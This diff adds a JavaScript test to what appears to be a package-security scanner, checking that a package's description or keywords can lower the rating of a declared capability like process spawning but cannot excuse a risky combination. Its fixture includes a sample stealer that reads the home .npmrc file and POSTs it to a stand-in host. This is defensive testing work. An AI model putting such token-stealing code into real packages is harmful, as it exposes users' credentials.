@@ -453,6 +453,18 @@ test('storm watch: what a project runs on, the PHP2Shell branches, advisories ma
   delete process.env.SLOWSHIP_ADVISORIES;
 });
 
+test('without the model, a capability a package names itself is expected (one step down), and no description lowers a combination', async () => {
+  const { named } = await import('../src/policy.js');
+  const judge = (src, manifest) => { const { facts } = fileFacts(src, 'index.js'), v = verdict({ facts }); return assess(v.short, combos(facts), named(v.short, manifest)); };
+  const spawner = "const { spawn } = require('child_process');\nmodule.exports = (cmd, args) => spawn(cmd, args);\n";
+  assert.equal(judge(spawner, { description: 'Cross platform child_process#spawn' }).level, 'notable');
+  assert.equal(judge(spawner, { keywords: ['spawn', 'cross-platform'] }).level, 'notable', 'keywords count too');
+  assert.equal(judge(spawner, { description: 'High performance image processing' }).level, 'review', '"processing" doesn\'t name running processes');
+  assert.equal(judge(spawner, { description: 'A tiny date formatter', keywords: 'spawn' }).level, 'review', 'keywords that aren\'t a list are ignored');
+  const stealer = "const fs = require('fs'), https = require('https');\nconst t = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');\nhttps.request({ host: 'x.example.invalid', method: 'POST' }).end(t);\n";
+  assert.equal(judge(stealer, { description: 'Uploads your credentials and auth tokens over https to the network' }).level, 'hold', 'a description can\'t talk down a combination');
+});
+
 test('what opening a project runs: ChainDrop\'s planted hook and folder-open task are held, a formatter hook is a glance, and a package that writes those files is held', async () => {
   const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
   const { autorunFacts, findAutorun } = await import('../src/agents.js');
